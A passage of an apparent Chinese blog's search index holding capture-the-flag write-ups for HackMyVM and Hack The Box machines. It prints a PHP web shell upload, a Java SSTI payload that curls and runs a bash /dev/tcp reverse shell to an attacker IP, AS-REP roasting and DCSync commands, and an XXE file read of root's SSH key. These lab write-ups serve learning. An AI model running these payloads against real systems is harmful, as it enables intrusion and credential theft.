PHPSESSID=smop95l7ie9o8dn57cv56s1so8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">John</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">Smith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">jsmith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;x&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;x&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh--</span><br></pre></td></tr></table></figure>

<p>发送成功后，头像从原来有张图片到现在加载不出来，在图片那里右键打开图片链接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102116.png" ></p>
<p>文件上传利用成功，接下来就输入nc反弹一个shell即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102209.png" ></p>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102250.png" ></p>
<p>在&#x2F;var&#x2F;www&#x2F;html的目录下找到数据库账号密码，也有看到bella用户，然后就尝试用这个登陆bella，成功</p>
<p>然后sudo -l查到doc可以利用，先执行看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102530.png" ></p>
<p>它打开了本地7890端口，再拿一个shell然后用socat转发端口看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102829.png" ></p>
<p>看起来是个文件管理系统，看了题解才知道这是pydoc，他是有漏洞的，一个思路是“&#x2F;getfile?key&#x3D;”后面跟上文件名就能读取到想要的文件，就可以&#x2F;getfile?key&#x3D;&#x2F;root&#x2F;root.txt</p>
<p>还有一个思路是在tmp目录下创建一个py文件，然后在见面搜索访问，也能执行我们想要的语句。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104332.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104446.png" ></p>
<p>提权成功</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这个靶机相对简单，也有一定的曲折，最后的pydoc没接触过，值得学习。</p>
<p>doc的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/usr/bin/pydoc3.9 -p 7890&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-EscapeTwo</title>
    <url>/2025/01/12/htb-EscapeTwo/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d5b2244614aa7ac906cc105543834441f162d03e15562842418402cc9f45ae8e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/15/hello-world/</url>
    <content><![CDATA[<p>一个开始。</p>
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Sauna复盘</title>
    <url>/2024/04/09/htb-Sauna%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/" >http://111.229.75.150/2023/10/11/htb%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97-sauna%E5%86%85%E7%BD%91%E6%89%AB%E7%9B%B2%E7%AF%87/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://m.freebuf.com/articles/network/286137.html" >https://m.freebuf.com/articles/network/286137.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_34801745/article/details/108136791" >https://blog.csdn.net/qq_34801745/article/details/108136791<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Sauna" >https://app.hackthebox.com/machines/Sauna<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：<strong>10.10.10.175</strong></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>先扫端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.10.175</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184941.png"   style="zoom:30%;" >

<p>扫出来有很多个端口，有kerberos+ldap等，大概率是域控，域名：EGOTISTICAL-BANK.LOCAL0.</p>
<h5 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L \\\\10.10.10.175 -N</span><br></pre></td></tr></table></figure>

<p>尝试smb匿名登陆，没发现什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409185909.png" ></p>
<h5 id="ldap枚举"><a href="#ldap枚举" class="headerlink" title="ldap枚举"></a>ldap枚举</h5><p>对于389的ladp服务，存在一个匿名绑定功能，通过这个功能可以不通过身份认证查询用户、组和计算机信息，我们尝试使用<a class="link"   href="https://github.com/ropnop/windapsearch" >windapsearch<i class="fas fa-external-link-alt"></i></a>看看能不能利用成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190131.png" ></p>
<p>没有什么收获</p>
<h5 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h5><p>80端口有开放，可以访问到网页，提示是说有个about.html，里面有很多人名</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184647.png"   style="zoom:50%;" >

<p>收集起来建一个user.txt，然后用<a class="link"   href="https://github.com/urbanadventurer/username-anarchy" >username-anarchy<i class="fas fa-external-link-alt"></i></a>生成一个字典</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409184624.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./username-anarchy --input-file user.txt --select-format first,flast,first.last,firstl &gt; unames.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409190453.png" ></p>
<h5 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h5><p>用字典可以查看是否有用户不需要经过Kerberos预身份验证。如果存在那么我们就可以得到其密码hash</p>
<blockquote>
<p> Kerberos 预⾝份验证是⼀项安全功能，可防⽌密码猜测攻击。在某些情况下，应⽤程序需要为其服务帐⼾启⽤此设</p>
<p>置。当不强制执⾏预认证时，可以直接发送虚拟认证请求。域控制器的密钥分发中⼼，（KDC）将检查⾝份验证服务请求（AS-REQ），验证⽤⼾信息并返回加密的票证授予票证（TGT）。 TGT 包含使⽤相应帐⼾的 NTLM 哈希加密的材料（时间戳）。可以从中派⽣出哈希值，该哈希值可以受到离线暴⼒攻击以泄露明⽂密码。</p>
</blockquote>
<p>这里用到impacket的脚本GetNPUsers.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile unames.txt  -outputfile hashes.asreproast -dc-ip 10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191257.png" ></p>
<p>成功拿到一串hash，用hashcat爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p>拿到密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191433.png" ></p>
<p>拿账号密码用Evil-WinRM登陆，拿到第一个flag</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409191657.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>上传一个winPEASany.exe，运行看看有什么可以提取的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.22.45.png" ></p>
<p>发现一串密码和一个新的用户svc_loanmgr，拿着这个再次登陆</p>
<p>用“net users svc_loanmgr”查看用户详细信息，发现是个Remote Management Users组</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2019.47.54.png"   style="zoom:50%;" >

<p>再看看这个组的情况，net localgroup “Remote Management Users”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
<p>“ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.”</p>
<p>该组成员具有远程管理系统的能力，权限达到管理，所以存在DCSync 攻击</p>
<blockquote>
<p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
<p>DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。</p>
</blockquote>
<p>使用secretsdump.py脚本复制权限为所有域⽤⼾显⽰ NTLM 哈希值。运⾏以下命令来转储主域管理员的密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/kali/impacket/examples/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409200452.png" ></p>
<p>成功拿到hash，然后再登陆，成功拿到管理员权限</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409201438.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：网页发现用户名–&gt;生成字典–&gt;查看是否有用户不需要Kerberos 预⾝份验证–&gt;拿到第一个账号密码–&gt;提权工具找到自动登录的账户密码–&gt;查看域内信息–&gt;发现DCSync 攻击–&gt;抓到管理员的hash–&gt;提权成功</p>
<p>新的知识点：Kerberos 预⾝份验证，自动化提权检测工具，DCSync 攻击。。</p>
<p>本来想试一下BloodHound查看域内信息，总是失败，不过看官方题解也能懂，可惜就记录不下来了</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb RedPanda复盘</title>
    <url>/2024/09/24/htb-RedPanda%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -sS -p- --min-rate=2000 10.10.11.170</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 16:21 HKT</span><br><span class="line">Warning: 10.10.11.170 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.11.170</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 64603 closed tcp ports (reset), 930 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>

<p>端口扫描扫到8080端口，直接访问，有个&#x2F;search，然后目录扫描也能看到&#x2F;stats，可以看到一些图片的路径，还有两个作者名字，还有一个可以生成xml文件（没什么敏感内容）的功能</p>
<p>然后看到网页源代码可以知道这个是个spring boot应用</p>
<p>主要针对这个search，尝试了sql注入，无果，后来看到了官方引导，才知道存在SSTI（下次应该自己试出来）</p>
<h4 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h4><p>输入<code>*&#123;8*7&#125;</code>，回显56，验证了ssti漏洞，在hacktricks找个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>可以命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924163217.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# cat /var/www/html/a.sh</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.14/8888 0&gt;&amp;1</span><br><span class="line">编写payload</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;curl http://10.10.16.14：9999/a.sh -o /tmp/a.sh&#x27;).getInputStream())&#125;</span><br><span class="line">*&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#x27;bash /tmp/a.sh&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>成功拿到shell</p>
<h4 id="靶机内信息搜集"><a href="#靶机内信息搜集" class="headerlink" title="靶机内信息搜集"></a>靶机内信息搜集</h4><p>&#x2F;opt文件夹下面有挺多东西的，要耐心翻找</p>
<p>在<code>/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java</code>文件里面能够看到woodenk用户的账号密码，拿去登陆ssh，可以成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924164021.png" ></p>
<p>然后实在太多东西，我跑了linpeas和pspy，主要是pspy64，可以看到</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165009.png" ></p>
<p>root有执行有关final…的jar包，在&#x2F;opt下面，woodenk用户还会定时删除xml文件</p>
<p>把jar包scp传输到本地，用jadx反编译了一下，看到了代码</p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924165726.png" ></p>
<p>需要审计，这部分我就是参考别人的wp努力理解可以怎么利用漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JDOMException, IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">log_fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/opt/panda_search/redpanda.log&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">log_reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(log_fd);</span><br><span class="line">        <span class="keyword">while</span> (log_reader.hasNextLine()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> log_reader.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (isImage(line)) &#123;</span><br><span class="line">                <span class="type">Map</span> <span class="variable">parsed_data</span> <span class="operator">=</span> parseLog(line);</span><br><span class="line">                System.out.println(parsed_data.get(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                <span class="type">String</span> <span class="variable">artist</span> <span class="operator">=</span> getArtist(parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">                System.out.println(<span class="string">&quot;Artist: &quot;</span> + artist);</span><br><span class="line">                <span class="type">String</span> <span class="variable">xmlPath</span> <span class="operator">=</span> <span class="string">&quot;/credits/&quot;</span> + artist + <span class="string">&quot;_creds.xml&quot;</span>;</span><br><span class="line">                addViewTo(xmlPath, parsed_data.get(<span class="string">&quot;uri&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>main函数按顺序调用几个函数，都是在上文自定义的</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseLog</span><span class="params">(String line)</span> &#123;</span><br><span class="line">        String[] strings = line.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;status_code&quot;</span>, Integer.valueOf(Integer.parseInt(strings[<span class="number">0</span>])));</span><br><span class="line">        map.put(<span class="string">&quot;ip&quot;</span>, strings[<span class="number">1</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;user_agent&quot;</span>, strings[<span class="number">2</span>]);</span><br><span class="line">        map.put(<span class="string">&quot;uri&quot;</span>, strings[<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseLog函数就是读取<code>/opt/panda_search/redpanda.log</code>，然后把里面的参数用｜分割，再保存，形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">405||10.10.16.14||Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0||/error</span><br></pre></td></tr></table></figure>

<p>然后再main函数返回那个叫<code>uri</code>的参数，后面要用</p>
<hr>
<p>接着往下时getArtist函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getArtist</span><span class="params">(String uri)</span> <span class="keyword">throws</span> IOException, JpegProcessingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullpath</span> <span class="operator">=</span> <span class="string">&quot;/opt/panda_search/src/main/resources/static&quot;</span> + uri;</span><br><span class="line">        <span class="type">File</span> <span class="variable">jpgFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fullpath);</span><br><span class="line">        <span class="type">Metadata</span> <span class="variable">metadata</span> <span class="operator">=</span> JpegMetadataReader.readMetadata(jpgFile);</span><br><span class="line">        <span class="keyword">for</span> (Directory dir : metadata.getDirectories()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Tag tag : dir.getTags()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tag.getTagName() == <span class="string">&quot;Artist&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> tag.getDescription();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;N/A&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个函数先将<code>/opt/panda_search/src/main/resources/static</code>和uri参数拼接出一个路径，加载那张图片，然后使用JpegMetadataReader读取图片里面的详细信息，相当于exiftool，如果图片解析出来有<code>Artist</code>字段，就返回，如果没有就返回空</p>
<hr>
<p>最后是addViewTo函数，path在main函数拼接好了，就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/credits/&quot; + artist + &quot;_creds.xml //artist字段是前面函数返回的</span><br></pre></td></tr></table></figure>

<p>这个函数主要是解析xml文件，增加图像的计数次数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addViewTo</span><span class="params">(String path, String uri)</span> <span class="keyword">throws</span> JDOMException, IOException &#123;</span><br><span class="line">        <span class="type">SAXBuilder</span> <span class="variable">saxBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">        <span class="type">XMLOutputter</span> <span class="variable">xmlOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLOutputter</span>();</span><br><span class="line">        xmlOutput.setFormat(Format.getPrettyFormat());</span><br><span class="line">        <span class="type">File</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> saxBuilder.build(fd);</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getRootElement();</span><br><span class="line">        <span class="keyword">for</span> (Element el : rootElement.getChildren()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (el.getName() == <span class="string">&quot;image&quot;</span> &amp;&amp; el.getChild(<span class="string">&quot;uri&quot;</span>).getText().equals(uri)) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">totalviews</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).getText()) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;Total views:&quot;</span> + Integer.toString(totalviews.intValue()));</span><br><span class="line">                rootElement.getChild(<span class="string">&quot;totalviews&quot;</span>).setText(Integer.toString(totalviews.intValue()));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">views</span> <span class="operator">=</span> Integer.valueOf(Integer.parseInt(el.getChild(<span class="string">&quot;views&quot;</span>).getText()));</span><br><span class="line">                el.getChild(<span class="string">&quot;views&quot;</span>).setText(Integer.toString(views.intValue() + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fd));</span><br><span class="line">        xmlOutput.output(doc, writer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里就存在XXE漏洞，在网站点击导出表格的功能时，就会触发，而且在这里解析的文件路径path是可控的，我们可以通过控制uri的值，控制 <code>artist</code>值</p>
<h4 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool shy.jpg -Artist=&quot;../home/woodenk/aaa&quot;</span><br></pre></td></tr></table></figure>

<p>先自己准备一张图片，用工具增加Artist字段，然后上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:~$ cat aaa_creds.xml </span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span><br><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY pencer SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;&lt;credits&gt;</span><br><span class="line">  &lt;author&gt;damian&lt;/author&gt;</span><br><span class="line">  &lt;image&gt;</span><br><span class="line">    &lt;uri&gt;../../../home/woodenk/shy.jpg&lt;/uri&gt;</span><br><span class="line">    &lt;hello&gt;&amp;pencer;&lt;/hello&gt;</span><br><span class="line">    &lt;views&gt;4&lt;/views&gt;</span><br><span class="line">  &lt;/image&gt;</span><br><span class="line">  &lt;totalviews&gt;4&lt;/totalviews&gt;</span><br><span class="line">&lt;/credits&gt;</span><br></pre></td></tr></table></figure>

<p>在靶机新建一个xml文件，里面使用到文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080 -H &quot;User-Agent: ||/../../../../../../../home/woodenk/shy.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>curl访问，增加字段到log文件，这一步是在控制uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">woodenk@redpanda:/opt/panda_search$ ^[[A</span><br><span class="line">cat redpanda.log </span><br><span class="line"></span><br><span class="line">200||10.10.16.14||||/../../../../../../../home/woodenk/shy.jpg||/</span><br></pre></td></tr></table></figure>

<p>因为我们在UA头前面多插入了一个||，这样本来是第三个字段的ua头被我们控制成第四个，也就是uri</p>
<p>最后访问网址触发功能点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.11.170:8080/export.xml?author=damian</span><br></pre></td></tr></table></figure>

<p>等一会，再查看aaa_creds.xml，就能看到我们要读取到内容，接下来就是用id_rsa登陆root，结束。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240924191714.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶机还挺有意思的，第一次接触java的ssti，虽然这次是直接套payload，然后靶机内信息搜集也挺需要耐心的，代码审计触发xxe漏洞那块，一开始看wp还感觉很麻烦，自己写复盘一路顺下来才理解，学习了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Heal笔记</title>
    <url>/2024/12/20/htb-Heal%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="295bfc1a15dcab86d65e99f7e6ae9d23e579558b6480a9a0ea72d457c162f9e1"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb OpenSource复盘</title>
    <url>/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/</url>
